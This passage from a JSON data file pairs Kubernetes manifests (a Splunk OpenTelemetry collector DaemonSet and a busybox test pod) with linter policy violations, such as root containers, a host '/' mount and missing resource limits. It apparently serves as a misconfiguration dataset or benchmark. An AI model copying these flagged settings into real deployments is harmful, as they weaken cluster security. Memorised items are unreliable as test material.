    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prepare-fluentd-config\" is not set to runAsNonRoot"
  },
  {
    "id": "2039",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"otel-collector\""
  },
  {
    "id": "2040",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"otel-collector\" has cpu request 0"
  },
  {
    "id": "2041",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prepare-fluentd-config\" has cpu request 0"
  },
  {
    "id": "2042",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prepare-fluentd-config\" has memory limit 0"
  },
  {
    "id": "2043",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"failing-pod\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2044",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"failing-pod\" does not have a read-only root file system"
  },
  {
    "id": "2045",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
